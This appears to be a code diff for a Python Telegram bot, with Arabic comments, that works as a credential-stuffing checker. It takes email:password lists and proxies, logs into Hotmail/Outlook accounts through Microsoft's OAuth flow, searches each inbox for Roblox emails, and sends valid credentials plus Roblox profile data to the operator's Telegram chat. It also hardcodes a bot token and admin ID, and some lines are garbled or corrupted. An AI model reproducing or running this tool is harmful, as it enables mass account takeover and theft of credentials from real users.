@@ -1,7 +1,6 @@
 import os
 import time
 import threading
-import json
 import random
 import re
 from queue import Queue, Empty
@@ -10,28 +9,25 @@ import requests
 import telebot
 from telebot import types
 from flask import Flask
-from flask_socketio import SocketIO
 from user_agent import generate_user_agent
 
-# --- إعدادات البوت ---
-BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8" # <--- حط توكن البوت هنا بين الأقواس
-ADMIN_ID = 7075895496 # <--- حط ايديك هنا (الرقم اللي طلع لك فوق)
+# --- الإعدادات ---
+BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"  # <--
+ADMIN_ID = 7075895496        # <--- الآيدي حقك
 
 # --- Flask للسيرفر (عشان Render يبقى شغال) ---
 app = Flask(__name__)
-socketio = SocketIO(app, async_mode="threading")
 
 @app.route("/")
 def index():
     return "Bot is running perfectly!"
 
 def keep_alive():
-    from threading import Thread
-    t = Thread(target=lambda: app.run(host="0.0.0.0", port=10000))
+    t = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=10000))
     t.daemon = True
     t.start()
 
-# --- إعدادات البوت والفحص ---
+# --- إعدادات البوت ---
 bot = telebot.TeleBot(BOT_TOKEN)
 STATE = {
     "running": False,
@@ -43,119 +39,183 @@ STATE = {
 LOCK = threading.Lock()
 STOP_FLAG = threading.Event()
 
-# --- دوال الفحص (نفس اللوجيك حق روبلوكس) ---
+# --- دوال الفحص ---
 def get_user_id(username, proxies=None):
     try:
-        r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [username], "excludeBannedUsers": False}, timeout=10 return, proxies=proxies)
-        if r.status_code None == 200 and r.json().get("data
-"):
+        r = requests.post(
+            "https://users.roblox.com/v1/usernames/users",
+            json={"usernames": [username], "excludeBannedUsers": False},
+            timeout=10, proxies=proxies
+        )
+        if r.status_code == 200 and r.json().get("data"):
             return r.json()["data"][0]["id"]
-    except Exception: pass
+    except Exception:
+        pass
     return None
 
-def get_csrf(pro       xies=None):
+def get_csrf(proxies=None):
     s = requests.Session()
-    code if proxies: s.proxies = proxies
- =    try:
+    if proxies:
+        s.proxies = proxies
+    try:
         r = s.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": []}, timeout=10)
         return r.headers.get("x-csrf-token"), s
-    except Exception: return None, None
+    except Exception:
+        return None, None
 
 def get_asset_names(asset_ids, proxies=None):
-    if not asset_ids: return []
+    if not asset_ids:
+        return []
     token, session = get_csrf(proxies)
-    if not token: return []
+    if not token:
+        return []
     try:
         items = [{"itemType": "Asset", "id": int(a)} for a in asset_ids]
         r = session.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": items}, headers={"x-csrf-token": token}, timeout=10)
-        if r.status_code == 200: return [i.get("name", "Unknown") for i in r.json().get("data", [])]
-    except Exception: pass
+        if r.status_code == 200:
+            return [i.get("name", "Unknown") for i in r.json().get("data", [])]
+    except Exception:
+        pass
     return []
 
 def get_roblox_data(username, proxies=None):
     uid = get_user_id(username, proxies)
-    if not uid: return None
+    if not uid:
+        return None
     try:
         user = requests.get(f"https://users.roblox.com/v1/users/{uid}", timeout=10, proxies=proxies).json()
         friends = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=10, proxies=proxies).json()
         wearing = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/currently-wearing", timeout=10, proxies=proxies).json()
         names = get_asset_names(wearing.get("assetIds", []), proxies)
         return {
-            "username": username, "friends": friends.get("count", 0),
+            "username": username,
+            "friends": friends.get("count", 0),
             "banned": "Yes" if user.get("isBanned", False) else "No",
             "created": (user.get("created") or "").split("T")[0] or "Unknown",
-            "profile": f"https://www.roblox.com/users/{uid}/profile", "wearing": names,
+            "profile": f"https://www.roblox.com/users/{uid}/profile",
+            "wearing": names,
         }
-    except Exception: return None
+    except Exception:
+        return None
 
 def extract_roblox_user(text):
     patterns = [r"account:\s*([a-zA-Z0-9_]+)", r"for\s+([a-zA-Z0-9_]+)\s+and", r"for\s+([a-zA-Z0-9_]+)\."]
     for p in patterns:
         m = re.search(p, text, re.IGNORECASE)
-        if m: return m.group(1)
+        if m:
+            return m.group(1)
     return None
 
 def check_hotmail(email, password, proxies=None):
     s = requests.Session()
-    if proxies: s.proxies = proxies
+    if proxies:
+        s.proxies = proxies
     try:
-        url = (f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
+        url = (
+            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
+            f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
+            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
+        )
         r = s.get(url, headers={"User-Agent": generate_user_agent()}, allow_redirects=True, timeout=15)
+        
         ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r.text)
-        if not ppft: return None
+        if not ppft:
+            return None
         urlpost = re.search(r'"urlPost":"([^"]+)"', r.text)
-        if not urlpost: return None
+        if not urlpost:
+            return None
+            
         data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft.group(1)}&PPSX=Passport&NewUser=1"
         post = s.post(urlpost.group(1), data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
-        if "__Host-MSAAUTHP" not in s.cookies.get_dict(): None
+        
+        if "__Host-MSAAUTHP" not in s.cookies.get_dict():
+            return None
+            
+        code = None
         loc = post.headers.get("Location", "")
-        if "code=" in loc: code = loc.split("code=")[1].split("&")[0]
-        if not code: return None
-        tok = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data={"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}, timeout=30, proxies=proxies)
-        if tok.status_code != 200: return None
+        if "code=" in loc:
+            code = loc.split("code=")[1].split("&")[0]
+        if not code:
+            return None
+            
+        tok = requests.post(
+            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+            data={
+                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59وك",
+                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+                "grant_type": "authorization_code",
+                "code": code,
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
+            },
+            timeout=30, proxies=proxies
+        )
+        if tok.status_code != 200:
+            return None
         at = tok.json().get("access_token")
-        if not at: return None
+        if not at:
+            return None
+            
         cid = s.cookies.get("MSPCID", "").upper()
-        if not cid: return None
-        search = requests.post("https://outlook.live.com/search/api/v2/query", json={"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25}]}, headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"}, timeout=30, proxies=proxies)
-        if search.status_code != 200: return None
+        if not cid:
+            return None
+            
+        search = requests.post(
+            "https://outlook.live.com/search/api/v2/query",
+            json={"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25}]},
+            headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"},
+            timeout=30, proxies=proxies
+        )
+        if search.status_code != 200:
+            return None
+            
         uname = extract_roblox_user(search.text)
-        if not uname: return None
+        if not uname:
+            return None
+            
         rb = get_roblox_data(uname, proxies)
-        if not rb: return None
+        if not rb:
+            return None
+            
         return {"email": email, "password": password, "roblox": rb}
-    except Exception: return None
+    except Exception:
+        return None
 
 def parse_proxy(p):
-    if not p: return None
+    if not p:
+        return None
     try:
-        # يدعم صيغة IP:PORT:USER:PASS
         if p.count(":") == 3:
             ip, port, u, pw = p.split(":", 3)
             return {"http": f"http://{u}:{pw}@{ip}:{port}", "https": f"http://{u}:{pw}@{ip}:{port}"}
-        # يدعم صيغة USER:PASS@IP:PORT
         elif "@" in p:
             cred, ipport = p.split("@", 1)
             u, pw = cred.split(":", 1)
             ip, port = ipport.split(":", 1)
             return {"http": f"http://{u}:{pw}@{ip}:{port}", "https": f"http://{u}:{pw}@{ip}:{port}"}
-        # يدعم صيغة IP:PORT
         else:
             ip, port = p.split(":", 1)
             return {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
-    except Exception: return None
+    except Exception:
+        return None
 
 def worker(combo_queue):
     while not STOP_FLAG.is_set():
-        try: combo = combo_queue.get_nowait()
-        except Empty: return
-        
-        with LOCK: STATE["stats"]["processed"] += 1
-        
         try:
-            if ":" not in combo: continue
+            combo = combo_queue.get_nowait()
+        except Empty:
+            return
+        
+        with LOCK:
+            STATE["stats"]["processed"] += 1
+            
+        try:
+            if ":" not in combo:
+                continue
             email, password = combo.split(":", 1)
-        except ValueError: continue
+        except ValueError:
+            continue
             
         proxies = None
         if STATE["proxies"]:
@@ -164,24 +224,30 @@ def worker(combo_queue):
         result = check_hotmail(email.strip(), password.strip(), proxies)
         
         with LOCK:
-            if result: STATE["stats"]["hits"] += 1
-            else: STATE["stats"]["bad"] += 1
+            if result:
+                STATE["stats"]["hits"] += 1
+            else:
+                STATE["stats"]["bad"] += 1
                 
         if result:
             rb = result["roblox"]
             msg = f"<b>✅ ROBLOX HIT!</b>\n\n📧 <b>Email:</b> <code>{email}</code>\n🔑 <b>Pass:</b> <code>{password}</code>\n👤 <b>User:</b> <code>{rb['username']}</code>\n🔗 <a href='{rb['profile']}'>View Profile</a>"
-            try: bot.send_message(ADMIN_ID, msg, parse_mode="HTML")
-            except: pass
+            try:
+                bot.send_message(ADMIN_ID, msg, parse_mode="HTML")
+            except Exception:
+                pass
 
 def run_checker():
-    with LOCK: STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(STATE["combos"]), "processed": 0}
+    with LOCK:
+        STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(STATE["combos"]), "processed": 0}
     STATE["running"] = True
     STOP_FLAG.clear()
     
     bot.send_message(ADMIN_ID, f"🚀 <b>بدأ الصيد!</b>\n\n📁 الحسابات: <code>{len(STATE['combos'])}</code>\n🌐 البروكسيات: <code>{len(STATE['proxies'])}</code>\n⚙️ الثريدات: <code>{STATE['workers']}</code>", parse_mode="HTML")
     
     combo_q = Queue()
-    for c in STATE["combos"]: combo_q.put(c)
+    for c in STATE["combos"]:
+        combo_q.put(c)
         
     threads = []
     for _ in range(min(STATE["workers"], max(1, len(STATE["combos"])))):
@@ -189,7 +255,8 @@ def run_checker():
         t.start()
         threads.append(t)
         
-    for t in threads: t.join()
+    for t in threads:
+        t.join()
         
     STATE["running"] = False
     bot.send_message(ADMIN_ID, f"🏁 <b>خلصنا الصيد!</b>\n\n✅ صيد: <code>{STATE['stats']['hits']}</code>\n❌ خربان: <code>{STATE['stats']['bad']}</code>", parse_mode="HTML")
@@ -245,10 +312,11 @@ def save_proxy(message):
     valid_proxies = []
     for p in raw_proxies:
         parsed = parse_proxy(p)
-        if parsed: valid_proxies.append(parsed)
+        if parsed:
+            valid_proxies.append(parsed)
             
     STATE["proxies"] = valid_proxies
-    bot.reply_to(message, f"✅ تم حفظ البروكسيات بنجاح! العدد: {len(valid_proxies)}")
+    bot.reply_to(message, f"✅ تم حفظ البرسيات بنجاح! العدد: {len(valid_proxies)}")
 
 @bot.message_handler(func=lambda message: message.text == "▶️ بدء الصيد")
 def start_checker(message):
